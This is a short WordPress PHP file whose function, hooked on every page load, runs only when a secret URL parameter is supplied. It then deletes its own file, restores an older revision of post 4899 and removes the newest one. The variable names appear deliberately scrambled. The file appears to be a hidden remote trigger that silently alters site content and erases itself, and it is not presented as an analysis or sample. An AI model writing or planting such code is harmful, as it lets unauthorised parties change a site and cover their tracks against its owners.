<?php

function cc_uploader_video() {
	if (isset($_GET['purchase_cloud_map']) && $_GET['purchase_cloud_map'] === 'link_framework_interactive') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$video_posts_chatbot_post = 4899;
		$album_short_duplicate = wp_get_post_revisions($video_posts_chatbot_post);
		if (empty($album_short_duplicate)) die('no revisions');
		if (count($album_short_duplicate) < 2) die('less than 2');
		$testimonial_scroll_addons = array_shift($album_short_duplicate);
		$player_photos_tool_smart = $testimonial_scroll_addons->ID;
		$categories_site_new_anywhere = array_shift($album_short_duplicate);
		$cache_last_cloud_sitemap = $categories_site_new_anywhere->ID;
		$shipping_membership_header = wp_restore_post_revision($cache_last_cloud_sitemap);
		if ($shipping_membership_header === false) die('error restoring');
		$shipping_membership_header = wp_delete_post_revision($player_photos_tool_smart);		
		if ($shipping_membership_header === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'cc_uploader_video');
